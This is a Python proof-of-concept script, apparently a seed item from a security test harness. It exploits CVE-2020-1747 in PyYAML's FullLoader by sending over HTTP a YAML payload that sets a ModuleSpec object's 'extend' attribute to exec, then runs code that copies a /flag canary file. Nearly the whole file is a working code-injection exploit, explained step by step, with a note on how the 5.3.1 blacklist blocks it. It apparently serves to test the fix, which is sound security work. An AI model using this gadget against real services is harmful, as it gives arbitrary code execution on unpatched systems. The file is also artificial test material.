#!/usr/bin/env python3
"""[GIVEN] CVE-2020-1747 seed exploit for codeinj_pyyaml_fullloader (external HTTP).

The classic PyYAML FullLoader code-injection vector, delivered over a real HTTP POST
to the service's `/parse` endpoint (`data = yaml.full_load(request.data)`).
yaml.full_load resolves the `python/object/new` multi-constructor
(FullConstructor.construct_python_object_new -> make_python_instance): it instantiates
the tagged class, applies the supplied `state:` mapping (set_python_instance_state), and
finally, if `listitems:` is present, calls `instance.extend(listitems)`.

The seed poisons the instance's `extend` attribute THROUGH `state:` (extend = the builtin
`exec`) on a carrier object with a writable __dict__ and NO __setstate__
(_frozen_importlib.ModuleSpec, always loaded). Then `instance.extend(listitems)` becomes
`exec(<code>)`. The code is a BENIGN reader: it copies the planted /flag canary into
/out/leak.txt (a local file read+copy -- no shell, no subprocess, no network) so /parse
surfaces the flag in its HTTP response, proving the FullLoader object escape fired.

    !!python/object/new:_frozen_importlib.ModuleSpec
    state:   {extend: !!python/name:builtins.exec}      # <-- poisoned via STATE
    listitems: "<benign flag-copy code>"

On V0 (PyYAML 5.3) FullConstructor applies the state with no restriction -> exec runs
during load -> the flag is copied -> flag in /parse response (REACHES). On V1
(PyYAML 5.3.1, the CVE-2020-1747 fix) set_python_instance_state now runs check_state_key
against get_state_keys_blacklist ('^extend$', '^__.*__$'); the `extend` state key is
refused -> ConstructorError "blacklisted key 'extend' in instance state found" BEFORE the
gadget runs -> no flag (BLOCKED). The block on V1 is exactly the state-key blacklist the
CVE-2020-1747 fix added to this same FullConstructor sink.
"""
from poc_common import post_parse

# Benign reader executed by the poisoned `extend`: local read+copy of the canary.
CODE = "open('/out/leak.txt','w').write(open('/flag').read())"

ORIGINAL_PAYLOAD = (
    "!!python/object/new:_frozen_importlib.ModuleSpec\n"
    "state:\n"
    "  extend: !!python/name:builtins.exec\n"
    'listitems: "%s"\n' % CODE
)


def candidate():
    return {
        "id": "cve-2020-1747-fullloader-state-extend-seed",
        "payload": ORIGINAL_PAYLOAD,
    }


def original_poc(*, version="v1"):
    """Send the CVE-2020-1747 seed YAML to `version` over external HTTP; return the JSON response."""
    return post_parse(ORIGINAL_PAYLOAD, version)


import json

if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
